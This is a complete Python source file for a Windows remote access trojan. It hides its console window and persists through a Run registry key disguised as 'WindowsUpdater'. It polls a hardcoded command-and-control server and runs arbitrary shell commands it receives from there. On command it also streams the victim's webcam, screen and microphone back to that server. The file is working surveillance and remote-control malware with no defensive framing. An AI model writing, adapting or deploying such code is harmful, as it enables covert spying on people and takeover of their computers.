import os
import sys
import time
import base64
import subprocess
import threading
import requests
import ctypes
import winreg
import importlib.util
from io import BytesIO

# CONFIG
SERVER_URL = "http://192.168.29.22:5000"
CLIENT_ID = "agent001"

def is_running_with_pythonw():
    return os.path.basename(sys.executable).lower() == "pythonw.exe"

def relaunch_with_pythonw():
    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    script = os.path.realpath(sys.argv[0])
    subprocess.Popen([pythonw, script])
    sys.exit(0)

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_to_startup():
    try:
        script_path = os.path.realpath(sys.argv[0])
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "WindowsUpdater"
        command = f'"{pythonw}" "{script_path}"'
        registry = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry, reg_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry)
    except:
        pass

def install_if_missing(module_name):
    if importlib.util.find_spec(module_name) is None:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def send_output(output):
    try:
        requests.post(f"{SERVER_URL}/output/{CLIENT_ID}", json={"output": output})
    except:
        pass

def stream_webcam():
    install_if_missing("opencv-python")
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        send_output("[!] Cannot access webcam.")
        return

    while True:
        ret, frame = cam.read()
        if not ret:
            break
        _, buffer = cv2.imencode(".jpg", frame)
        b64_img = base64.b64encode(buffer).decode()
        try:
            requests.post(f"{SERVER_URL}/frame/{CLIENT_ID}", json={"frame": b64_img})
        except:
            break
        time.sleep(0.2)

def stream_screen():
    install_if_missing("opencv-python")
    install_if_missing("Pillow")
    import cv2
    from PIL import ImageGrab
    import numpy as np

    while True:
        img = ImageGrab.grab()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        _, buffer = cv2.imencode('.jpg', frame)
        b64_img = base64.b64encode(buffer).decode()
        try:
            requests.post(f"{SERVER_URL}/frame/{CLIENT_ID}", json={"frame": b64_img})
        except:
            break
        time.sleep(0.3)

def stream_mic():
    install_if_missing("sounddevice")
    import sounddevice as sd
    import numpy as np

    samplerate = 44100
    duration = 0.5
    channels = 1

    while True:
        try:
            audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels, dtype='int16')
            sd.wait()
            requests.post(f"{SERVER_URL}/mic/{CLIENT_ID}", data=audio.tobytes())
        except:
            break
        time.sleep(0.2)

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e	:
        output = e.output
    send_output(output)

def poll_commands():
    while True:
        try:
            r = requests.get(f"{SERVER_URL}/command/{CLIENT_ID}")
            cmd = r.json().get("cmd", "").strip()
            if cmd:
                if cmd == "livecam":
                    threading.Thread(target=stream_webcam, daemon=True).start()
                elif cmd == "livescreen":
                    threading.Thread(target=stream_screen, daemon=True).start()
                elif cmd == "livemic":
                    threading.Thread(target=stream_mic, daemon=True).start()
                elif cmd == "exit":
                    send_output("[*] Agent exiting.")
                    break
                else:
                    execute_command(cmd)
        except:
            pass
        time.sleep(3)

def register():
    try:
        requests.post(f"{SERVER_URL}/register", json={"id": CLIENT_ID})
    except:
        pass

def main():
    if not is_running_with_pythonw():
        relaunch_with_pythonw()
    hide_console()
    add_to_startup()
    register()
    poll_commands()

if __name__ == "__main__":
    main()
